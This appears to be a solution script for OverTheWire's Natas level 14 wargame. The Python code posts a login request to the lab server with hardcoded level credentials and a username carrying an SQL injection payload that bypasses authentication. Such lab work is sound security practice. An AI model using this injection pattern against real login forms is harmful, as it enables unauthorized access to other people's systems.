import requests as r

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://' + username + '.natas.labs.overthewire.org/?debug'

session = r.Session()
data = {'username':'user" OR "1=1"#', 'password':'pw'}
response = session.post(url, data, auth = (username, password))

print(response.text)

